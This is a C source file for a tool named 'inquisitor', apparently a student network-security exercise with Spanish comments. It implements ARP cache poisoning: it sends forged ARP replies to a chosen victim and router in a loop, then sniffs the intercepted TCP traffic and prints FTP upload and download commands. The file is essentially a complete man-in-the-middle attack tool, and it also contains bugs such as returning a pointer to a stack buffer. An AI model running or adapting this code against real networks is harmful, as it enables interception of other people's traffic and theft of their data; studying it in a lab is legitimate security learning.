#include "inquisitor.h"
//eliminar luego
#include "include/inquisitor.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <signal.h>
#include <netinet/ip.h>
#include <ifaddrs.h>

volatile int loop = 42;

static void usage(void)
{
	printf("./inquisitor [IP-src] [MAC-src] [IP-target] [MAC-target]\n");
	exit(1);
}

void error(const char *message)
{
	printf("[INQUISITOR] error: %s\n", message);
	exit(1);
}

//nic = network interface card
static char *get_nic(struct ifaddrs *ifaddr)
{
	char *nic;
	int family, flag;
	
	nic = NULL;
	for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) 
	{
		if (ifa->ifa_addr == NULL)
			continue;
		if (ifa->ifa_flags & IFF_LOOPBACK)
			continue;
		flag = 0;
		family = ifa->ifa_addr->sa_family;
		if (family == AF_PACKET) 
		{
			if (ifa->ifa_flags & IFF_UP)
				flag++;
			if (ifa->ifa_flags & IFF_RUNNING)
				flag++;
		}
		if (flag == 2)
		{
			nic = ifa->ifa_name;
			break ;
		}
	}
	return (nic);
}

static int raw_socket()
{
	struct timeval tv_out;
	int sock_fd;
	tv_out.tv_sec = 2;
    tv_out.tv_usec = 0;

	sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock_fd < 0)
		error("socket failed");
	if (setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, &tv_out, sizeof(tv_out)) < 0)
		error("configure socket options failed");
	return (sock_fd);
}

static void send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
{
	struct sockaddr_ll sll;

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;      
	sll.sll_ifindex = index;     
	sll.sll_halen = ETH_ALEN; 

	memcpy(sll.sll_addr, dest_mac, ETH_ALEN);

	if (sendto(sock, pkt, sizeof(struct arp_packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
		error("Failed to send");
}

static void fill_arp_request(t_session session, struct arp_packet *pkt, int protocol)
{
	//Ethernet header	
	memset(pkt->eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
	memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: MAC
	pkt->eth.h_proto = htons(ETH_P_ARP);			// Tipo: ARP (0x0806)

	//Body ARP
	pkt->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // Hardware: Ethernet (1)
	pkt->arp.ea_hdr.ar_pro = htons(ETH_P_IP);    // Protocolo: IPv4 (0x0800)
	pkt->arp.ea_hdr.ar_hln = 6;                  // Tamaño MAC: 6
	pkt->arp.ea_hdr.ar_pln = 4;                  // Tamaño IP: 4
	pkt->arp.ea_hdr.ar_op = htons(protocol); // Operación: REQUEST | REPLY

	//Directions inside body ARP
	memcpy(pkt->arp.arp_sha, session.src.mac, 6);           // Sender MAC
	memcpy(pkt->arp.arp_spa, &session.src.ip.s_addr, 4);    // Sender IP
	memcpy(pkt->arp.arp_tha, session.dst.mac, 6);  	       // Target MAC 
	memcpy(pkt->arp.arp_tpa, &session.dst.ip.s_addr, 4);    // Target IP 
}

static unsigned char *receive_arp_response(int socket)
{
	struct arp_packet resp;
	struct sockaddr_ll from;
	socklen_t from_len = sizeof(from);

	ssize_t res = recvfrom(socket, &resp, sizeof(resp), 0, (struct sockaddr*)&from, &from_len);

	if (res > 0) 
	{
		if (ntohs(resp.eth.h_proto) == ETH_P_ARP && ntohs(resp.arp.ea_hdr.ar_op) == ARPOP_REPLY) 
		{
			unsigned char *mac = resp.arp.arp_sha;
			return (mac);
		}
	}
	return (0);
}

static void get_access_point_mac(int socket, unsigned int *index, t_session session, t_pair *access_point)
{
	unsigned char *temp_mac;
	struct ifaddrs *ifaddr;
	struct arp_packet pkt;
	t_session first;

	if (getifaddrs(&ifaddr) == -1)\
		error("cannot access mac address of the system");

	char *name = get_nic(ifaddr);
	*index = if_nametoindex(name);           
	first.src.ip = session.dst.ip;
	memcpy(first.dst.mac, session.dst.mac, 6);
	first.dst.ip = session.src.ip;
	memset(first.dst.mac, 0, 6);
	fill_arp_request(first, &pkt, ARPOP_REQUEST);
	send_packet(socket, *index, &pkt, pkt.eth.h_dest);
	temp_mac = receive_arp_response(socket);
	if (temp_mac)
    	memcpy(access_point->mac, temp_mac, 6);
	else 
		error("Cannot get access point MAC");
	freeifaddrs(ifaddr);
}

static void poisoning(int sock, int index, t_session session, t_pair access_point)
{
	struct arp_packet router_packet;
	struct arp_packet victim_packet;
	t_session router_session;
	time_t last_poison = 0;
	unsigned char buffer[2048];

	router_session = session;
	router_session.src.ip = session.dst.ip;
	router_session.dst.ip = session.src.ip;

	memcpy(router_session.dst.mac, access_point.mac, 6);

	while(loop)
	{
		time_t now = time(NULL);
		if (now - last_poison >= 2)
		{
			//POISON VICTIM 
			//session -> src -> ip victim  
			//session -> src -> mac attacker 
			//session -> dst -> ip router  
			//session -> dst -> mac router 
			//access_point -> mac victim
			fill_arp_request(session, &victim_packet, ARPOP_REPLY);
			send_packet(sock, index, &victim_packet, access_point.mac);
			//POISON ROUTER 
			//router_session -> src -> ip router  
			//router_session -> src -> mac attacker 
			//router_session -> dst -> ip victim  
			//router_session -> dst -> mac victim 
			fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
			send_packet(sock, index, &router_packet, session.dst.mac);
			last_poison = now;
		}

		ssize_t bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
		struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));

		if (ip->protocol == IPPROTO_TCP) 
		{
			struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + (ip->ihl * 4));

			// Calculamos dónde empiezan los datos del FTP
			unsigned char *payload = (unsigned char *)tcp + (tcp->th_off * 4);
			int payload_size = bytes - (sizeof(struct ethhdr) + (ip->ihl * 4) + (tcp->th_off * 4));

			if (payload_size > 0)
			{
				if (memmem(payload, payload_size, "STOR ", 5))
					printf("\033[1;31m[INQUISITOR] DETECTADO 'PUT': %.*s\033[0m", payload_size, payload);
				else if (memmem(payload, payload_size, "RETR ", 5))
					printf("\033[1;34m[INQUISITOR] DETECTADO 'GET': %.*s\033[0m", payload_size, payload);
			}
		}
	}
}

//signal handler
static void loop_handler(int sig)
{
	loop = 0;
	(void)sig;
}

int main (int ac, char *av[])
{
	int socket;
	unsigned int index;
	t_session session;
	t_pair access_point;

	if (ac != 5)	
		usage();
	parse_input(av, &session);
	socket = raw_socket();
	get_access_point_mac(socket, &index, session, &access_point);
	signal(SIGINT, loop_handler);
	poisoning(socket, index, session, access_point);

	printf("[DEBUG] MAC Recibida: %02x:%02x:%02x:%02x:%02x:%02x\n",
		access_point.mac[0], access_point.mac[1], access_point.mac[2], access_point.mac[3], access_point.mac[4], access_point.mac[5]);
	return (0);
}
